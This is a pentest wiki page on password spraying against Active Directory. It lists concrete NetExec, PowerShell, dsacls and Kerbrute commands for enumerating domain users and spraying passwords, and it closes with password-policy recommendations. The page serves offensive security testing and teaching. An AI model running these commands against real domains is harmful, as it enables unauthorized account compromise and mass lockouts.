---
layout: default
title: Password Spraying
parent: Active Directory
nav_order: 13
permalink: /ad/spraying/
---

# Password Spraying
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

{: .warning }
> This exploit can **lock** a large amount of - or even all - domain accounts. Be careful to **not perform to much attemps** on the same usernames or ensure to **know the enforced password policy** first.

## Vulnerability

For this attack, vulnerability isn't technical. It is simply humans too lazy to put strong and unique passwords.

Password spraying consist in trying a very few passwords for a large amount of potential usernames. It is kind of the opposite of [Active Directory brute-force attack](/ad/bruteforce/), where you attempt many passwords.

## Prerequisites

- Network access.
- Information about your target.

## Exploit

To perform password spraying on a domain, target a domain controller or a domain joined computer if you can't access a domain controller. If you already have an initial footprint on the domain, just run one of the following commands to get usernames.

```bash
# With NetExec (https://github.com/Pennyw0rth/NetExec).
nxc smb $dc_ip -d $domain -u $username -p $password --users

# From a domain joined Windows computer.
net user /domain

# From a domain joined computer with DomainPasswordSpray PowerShell module (https://github.com/dafthack/DomainPasswordSpray).
Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
```

Otherwise, you can use OSINT tools like [linkedin2username](https://github.com/initstring/linkedin2username) to generate username lists.

Usernames often have the same nomenclature like `f.lastname` or `firstname.lastname`. Nevertherless, you should first ensure the correct terminology before starting password spraying. 

```bash
# Try the same password for every username.
nxc smb $target -d $domain -u usernames.txt -p $password

# Try multiple passwords for every username.
nxc smb $target -d $domain -u usernames.txt -p passwords.txt

# Try line by line (username1 with password1, username2 with password2, etc.).
nxc smb $target -d $domain -u usernames.txt -p passwords.txt --no-bruteforce

# From a domain joined computer with DomainPasswordSpray PowerShell module.
Invoke-DomainPasswordSpray -Password $password

# From a domain joined computer using dsacls.exe built-in binary.
dsacls.exe "$distinguishedname" /user:$username@$domain /passwd:$password

# From a domain joined computer using Kerbrute (https://github.com/ropnop/kerbrute).
./Kerbrute.exe passwordspray -d $domain usernames.txt $password
```

## Recommendations

- [ ] Use strong passwords that are not easily sprayable.
- [ ] Enfore strict password policies with account lockout threshold.
- [ ] Do not reuse passwords from a system to another.